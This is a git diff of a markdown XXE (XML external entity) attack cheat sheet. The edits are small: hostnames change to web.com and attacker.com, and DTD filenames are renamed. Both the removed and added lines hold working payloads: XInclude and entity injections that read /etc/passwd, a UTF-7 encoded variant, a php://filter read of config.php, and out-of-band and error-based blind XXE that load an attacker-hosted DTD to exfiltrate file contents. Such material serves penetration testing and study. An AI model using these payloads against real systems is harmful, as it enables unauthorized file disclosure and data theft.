@@ -116,7 +116,7 @@ Cause a denial of service by repeatedly calling entity's functions
 **See if there is an XXE without it being seen in the request**
 
 One way to identify an XML blind in a request: If the application embeds the submitted data in an XML document and then parses the document as it passes in a backend SOAP request.
-We can try injecting XInclude which is a part of the XML specification that allows you to create an XML document from subdocuments..<br>
+We can try injecting XInclude which is a part of the XML specification that allows you to create an XML document from subdocuments.<br>
 Example:
 ```xml
 <foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/></foo>
@@ -124,13 +124,13 @@ Example:
 
 
     POST /product/stock HTTP/1.1
-    Host: domain.com
+    Host: web.com
     Content-Length: 126
     
     productId=1&storeId=1
     ------------------------------
     POST /product/stock HTTP/1.1
-    Host: domain.com
+    Host: web.com
     Content-Length: 126
     
     productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
@@ -141,16 +141,16 @@ Example:
 <foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/></foo>
 
     POST /product/stock HTTP/1.1
-    Host: domain.com
+    Host: web.com
     Content-Length: 126
     
     productId=1&storeId=1
     ------------------------------
     POST /product/stock HTTP/1.1
-    Host: domain.com
+    Host: web.com
     Content-Length: 126
     
-    productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="http://attacker-web.com"/></foo>&storeId=1
+    productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="http://attacker.com"/></foo>&storeId=1
 ```
 
 **Blind XXE test (When it does not return values)**
@@ -170,7 +170,7 @@ Example:
 ```xml
 <?xml version="1.0" encoding="UTF-7"?>
 +ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
-+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://attacker-web.com+ACI +AD4AXQA+
++ADwAIQ-ENTITY xxe SYSTEM +ACI-http://attacker.com+ACI +AD4AXQA+
 +ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
 ```
 
@@ -179,7 +179,7 @@ Example:
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE foo [
-<!ENTITY load SYSTEM "php://filter/read=convert.base64-encode/resource=http://vulnerable-web.com/config.php">]>
+<!ENTITY load SYSTEM "php://filter/read=convert.base64-encode/resource=http://web.com/config.php">]>
 <foo><result>&load;</result></foo>
 ```
 
@@ -192,18 +192,18 @@ Example:
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?> 
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker-web.com"> ]>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com"> ]>
 ```
 
 **EXAMPLE 2**
 - Payload that we will include completely in the xml value that is sent. It will make a request to the attacker's website, so we can know if it really processes the information we send it.
 
 ```xml
-<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker-web.com"> %xxe; ]>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com"> %xxe; ]>
 ```
 
 **EXAMPLE 3**
-- Code from http://attacker-web.com/cositas.dtd
+- Code from http://attacker-web.com/erik.dtd
 
 ```xml
 <!ENTITY % file SYSTEM "file:///etc/passwd">
@@ -212,15 +212,15 @@ Example:
 %exfiltrate; 
 ```
 
-- XML injection before the values of the page, it will inject the code of cositas.dtd in the page
+- XML injection before the values of the page, it will inject the code of erik.dtd in the page
 
 ```xml
-<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker-web.com/cositas.dtd"> %xxe;]>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/erik.dtd"> %xxe;]>
 ```
 
 **EXAMPLE 4**
 - XXE BLIND based on error message
-- Code from http://attacker-web.com/cositas.dtd
+- Code from http://attacker.com/erik.dtd
 
 ```xml
 <!ENTITY % file SYSTEM "file:///etc/passwd">
@@ -229,10 +229,10 @@ Example:
 %error;
 ```
 
-- XML injection in the page, it will inject the code of cositas.dtd
+- XML injection in the page, it will inject the code of erik.dtd
 
 ```xml
-<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker-web.com/cositas.dtd"> %xxe;]>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/erik.dtd"> %xxe;]>
 ```
 
 **EXAMPLE 5**
